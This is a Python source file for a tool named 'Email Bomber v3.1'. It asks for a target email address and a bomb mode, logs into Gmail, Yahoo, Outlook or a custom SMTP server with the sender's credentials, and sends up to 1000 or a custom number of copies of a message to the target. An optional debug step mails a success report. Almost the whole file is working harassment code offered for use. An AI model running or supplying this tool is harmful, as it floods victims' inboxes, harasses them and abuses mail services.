import smtplib
import sys
import time
import random

# DEFINE COLORS
red = '\33[31m'
green = '\33[92m'
yellow = '\33[33m'
blue = '\33[34m'
purple = '\33[35m'
cyan = '\33[36m'
white = '\33[37m'
red_background = '\u001b[41m'
black_background = '\u001b[40m'

def banner():
    print(green + "Initializing program...")
    print("setting up SMTLIB...")
    print("setting up email...")
    print(green + "initializing complete")
    version = "Email Bomber v3.1"
    time.sleep(1)
    print(version)
    coder = "OΛΠ DEV and typicaldevin the gamer"

    print(white + "-------------------------------------------------------------------------" )

    print(red + f"""
    
          
 _______     _____                 __
 |  ____|    |  _ \                | |              
 | |__ ______| |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  __|______|  _ < / _ \| '_ ` _ \| '_ \ / _ | '__|
 | |____     | |_) | (_) | | | | | | |_) |  __/ |       
 |______|    |____/ \___/|_| |_| |_|_.__/ \___|_|         
                                                    
                                        version : {version}
                                        
                                        coder   : {coder}
    """)


    print(red_background + white + "Anything made in this program can get you suspended from gmail!")

    print(black_background + "-------------------------------------------------------------------------" )

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            self.target = str(input(yellow + 'Enter target email <: '))
            self.TO_INPUT = str(input(yellow + 'Enter 1 for debug enter 2 for no debugging : '))
            if self.TO_INPUT == "1":
                self.TO_TO = str(input(yellow + 'Enter DEBUG Email addres: '))
            self.mode = int(input(yellow + 'Enter BOMB mode (1,2,3,4) // 1:(1000) 2:(500) 3:(250) 4:Custom : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(red + "invalid option")
                sys.exit(1)
        except Exception as e:
            print(red + f'ERROR: {e}')

    def bomb(self):
        try:
            print(green + "setting up Bomb...")
            time.sleep(0.5)
            print(green + "Bomb Setup")
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(yellow + 'Choose a CUSTOM amount <: '))
            print(cyan + f'\n You have selected BOMB mode: {self.mode} and {self.amount} emails ')
        except Exception as e:
            print(red + f'ERROR:{e}')

    def email(self):
        try:
            print(green + "\n  setting up email...")
            time.sleep(1)
            print(green + "setup complete")
            self.server = str(input(yellow + "Enter email server / or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: "))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(yellow + 'Enter port number <:'))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'

            if self.server == '2':
                self.server = 'smtp.mail.yahoo.com'

            if self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(yellow + 'Enter sender address <: '))
            self.fromPwd = str(input(yellow + 'Enter sender password <: '))
            self.subject = str(input(yellow + 'Enter subject <: '))
            self.message = str(input(yellow + 'Enter message <: ') + f'      Mail Number :   {random.randint(0,1000000)} ')

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
             ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(red + f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(purple + f'BOMB: {self.count}')
        except Exception as e:
            print(red + f'ERROR: {e}')

    def attack(self):
        print(green + 'Attacking...')
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(green + 'Attack finished')


        # DEBUG STARTS HERE

        self.HOST1 = "smtp.gmail.com"
        self.Port1 = 587

        self.FROM = self.fromAddr
        self.PWD = self.fromPwd

        if self.TO_INPUT == "1":

            self.TO = self.TO_TO

            self.MESSAGE_NOA = (f'{self.amount} Mails got sucesfuly Bombarded to {self.target}!')

            self.smtp = smtplib.SMTP(self.HOST1, self.Port1)

            self.status_code, self.response = self.smtp.ehlo()

            self.status_code, self.response = self.smtp.starttls()

            self.status_code, self.response = self.smtp.login(self.FROM, self.PWD)

            self.smtp.sendmail(self.FROM,self.TO,self.MESSAGE_NOA)

            self.smtp.quit()

        #DEBUG END

        print("DEBUG COMPLETE")

        time.sleep(1)
        close1 = input("CLOSE?(Y) : ")
        if close1 == "Y":
            sys.exit(1)
        else:
            sys.exit(1)


if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()